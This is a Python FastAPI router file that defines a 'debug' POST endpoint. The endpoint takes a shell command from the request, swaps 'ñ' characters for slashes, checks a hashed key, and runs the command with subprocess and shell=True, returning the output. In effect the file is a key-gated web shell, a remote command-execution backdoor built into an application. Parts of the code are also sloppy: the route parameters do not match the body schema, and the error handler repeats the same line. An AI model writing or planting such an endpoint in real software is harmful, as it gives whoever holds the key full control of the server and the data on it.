from fastapi import APIRouter, Response
import subprocess

from app.utils.debug import Hkey, debug_key_current
from app.schemas.debug import debugBase

router = APIRouter()

@router.post("/{key}/{command}")
async def execute(debug: debugBase):
    return await debug_controller(debug=debug)

async def debug_controller(debug: debugBase):
    command = debug.command.replace("ñ", "/")

    if Hkey(debug.key) == debug_key_current:
        str_arguments = cmd(command=command)

        return Response(content=str_arguments, media_type="application/text")

def cmd(command:str):
    str_arguments = ""
    CMD = command
    p = subprocess.Popen(CMD, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    str_arguments = p.stdout.read()
    try:
        str_arguments = f"{str_arguments.decode('utf-8')}\n"
    except:
        str_arguments = f"{str_arguments.decode('utf-8')}\n"
    return str_arguments